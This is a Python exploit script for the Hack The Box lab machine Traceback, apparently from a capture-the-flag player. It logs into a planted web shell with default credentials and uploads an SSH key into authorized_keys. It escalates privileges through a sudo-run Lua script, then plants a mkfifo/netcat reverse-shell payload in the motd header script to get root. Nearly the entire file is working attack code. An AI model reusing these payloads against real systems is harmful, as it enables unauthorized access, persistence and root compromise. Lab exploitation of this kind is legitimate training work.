#!/usr/bin/env python
#author:script1337
import fcntl
import socket
import struct
import subprocess
import sys
import os
import requests
from termcolor import colored
import re

url = "http://traceback.htb/smevk.php"

s = requests.session()

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "34",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1"

}

uploadheader = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------14199339101014636045803192898",
    "Content-Length": "1279",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
    "DNT": "1"

}


def authorized_keys(id_rsa_pub, path, file):
    authorized_keys = """
-----------------------------14199339101014636045803192898
Content-Disposition: form-data; name="a"

FilesMAn
-----------------------------14199339101014636045803192898
Content-Disposition: form-data; name="c"

{path}
-----------------------------14199339101014636045803192898
Content-Disposition: form-data; name="p1"

uploadFile
-----------------------------14199339101014636045803192898
Content-Disposition: form-data; name="charset"

UTF-8
-----------------------------14199339101014636045803192898
Content-Disposition: form-data; name="f"; filename="{filename}"
Content-Type: application/vnd.ms-publisher

{id_rsa_pub}

-----------------------------14199339101014636045803192898--
    """.format(id_rsa_pub=id_rsa_pub, path=path, filename=file)

    return authorized_keys


def get_ip_address():
    return re.search(re.compile(r'(?<=inet )(.*)(?=/)', re.M), os.popen('ip addr show tun0').read()).groups()[0]


def ssh(username, command, keyfilename):
    server = "10.10.10.181"
    subprocess.Popen(
        "ssh -i {id_rsa_key_file_location} {user}@{host} {cmd}".format(id_rsa_key_file_location=keyfilename,
                                                                       user=username, host=server, cmd=command),
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()


def luaprivesp(authorized_keys):
    luacode = """
local test = io.open("/home/sysadmin/.ssh/authorized_keys", "a")
test:write("{id_rsa_pubkey}\\n")
test:close()""".format(id_rsa_pubkey=authorized_keys)
    return luacode


def printfc(text, color):
    if color == "red":
        print(colored(text, 'green'))
    if color == "green":
        print(colored(text, 'red'))
    if color == "yellow":
        print(colored(text, 'yellow'))


def foothold(id_rsa_key_file_location, authorized_keys, luaprivesp):
    global url, header, uploadheader, injection_url
    printfc("[+]Trying to login into the shell..", "yellow")
    creds = "uname=admin&pass=admin&login=Login"
    r = s.post(url, data=creds, headers=header)
    if r.status_code == 200:
        printfc("[+]Successfully login into the webshell...", "green")
    else:
        printfc("[*]Bad day bro something goes wrong!!!", "red")
    printfc("[+]uploading authorized_keys...", "yellow")
    r = s.post(url, data=authorized_keys, headers=uploadheader)
    printfc("[+]Successfully uploaded authorized_keys...", "green")
    printfc("[+]status_code =>" + str(r.status_code), "green")
    printfc("[+]uploading lua script...", "yellow")
    r = s.post(url, data=luaprivesp, headers=uploadheader)
    printfc("[+]Successfully uploaded lua script...", "red")
    printfc("[+]status_code =>" + str(r.status_code), "green")
    ssh("webadmin", "sudo -u sysadmin /home/sysadmin/luvit privesc.lua", id_rsa_key_file_location)
    printfc("sudo done", "green")


def root(id_rsa_key_file_location):
    printfc("Going for  root...", "red")
    ipaddr = get_ip_address()
    port = 1234
    payload = """vi /etc/update-motd.d/00-header -c '%s/echo/rm \/tmp\/x\;mkfifo \/tmp\/x\;cat \/tmp\/x\|\/bin\/bash \-i 2>\&1\|nc {ipaddr} {port} \>\/tmp\/x # \' -c wq""".format(
        ipaddr=ipaddr, port=port)
    for i in range(2):
        printfc("sending payload => rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/bash -i 2>&1|nc " + ipaddr + "4444",
                "green")
        os.system("echo \"rm /var/tmp/*\" | ssh -i " + id_rsa_key_file_location + " sysadmin@10.10.10.181")
        printfc("payload injected successfully!...", "red")
        os.system("echo \"" + payload + "\" | ssh -i " + id_rsa_key_file_location + " sysadmin@10.10.10.181")
        print("hoping get revese shell")
        ssh("sysadmin", "", id_rsa_key_file_location)


if len(sys.argv) == 3:
    os.system("clear")
    id_rsa_pub_key_file_location = str(sys.argv[1])
    id_rsa_key_file_location = str(sys.argv[2])
    printfc("""
                _        _   _                     _      _   _ ____________ 
  __ ___ __| |___ __| | | |__ _  _   _____ _ _(_)_ __| |_/ |__ |__ |__  |
 / _/ _ / _` / -_/ _` | | '_ | || | (_-/ _| '_| | '_ |  _| ||_ \|_ \ / / 
 \__\___\__,_\___\__,_| |_.__/\_, | /__\__|_| |_| .__/\__|_|___|___//_/  
                              |__/              |_|                      
                              team : 47hD1m3n5i0N
                              github : https://github.com/ScRiPt1337
                              memeber : CyberLion , 1nv1s1bl3 , 0xPrashant , Mr black hex

    """, "yellow")
    printfc("Selected Rsa public key => " + id_rsa_pub_key_file_location, "red")
    printfc("Selected Rsa private key => " + id_rsa_key_file_location, "red")
    printfc("Please open a new terminal and type this command to get root shell => nc -lnvp 1234", "red")
    try:
        f = open(id_rsa_pub_key_file_location, "r")
        key = f.read().rstrip()
        luaprivesp = authorized_keys(luaprivesp(key), "/home/webadmin", "privesc.lua")
        authorized_keys = authorized_keys(key, "/home/webadmin/.ssh", "authorized_keys")
        foothold(id_rsa_key_file_location, authorized_keys, luaprivesp)
        root(id_rsa_key_file_location)
    except Exception as inst:
        print(inst)
        sys.exit()
else:
    print("please enter your rsa key")
    print("""
        python traceback.py ~/.ssh/ 
        """)
    sys.exit()
